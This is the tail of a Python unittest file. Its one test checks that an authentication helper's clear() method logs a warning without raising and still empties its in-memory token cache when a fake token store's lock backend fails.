        # M4 / clear(): the file-delete runs under the store's cross-process lock.
        # If the LOCK BACKEND itself raises (a custom store), clear() must warn and
        # carry on — the in-memory cache is still cleared — not propagate. The
        # existing clear-failure test covers clear() raising; this covers in_lock
        # raising (the lock backend), the other guarded site.
        store = _FakeStore()
        auth = self.make_auth(token_store=store)
        auth.token()
        store.fail_in_lock = True
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            auth.clear()                       # in_lock raises; must not propagate
        self.assertIn('token store clear failed', err.getvalue())
        self.assertIsNone(auth._tokens)        # in-memory cache cleared regardless
        self.assertEqual(store.clears, 0)      # clear() never reached (lock failed)


if __name__ == '__main__':
    unittest.main()
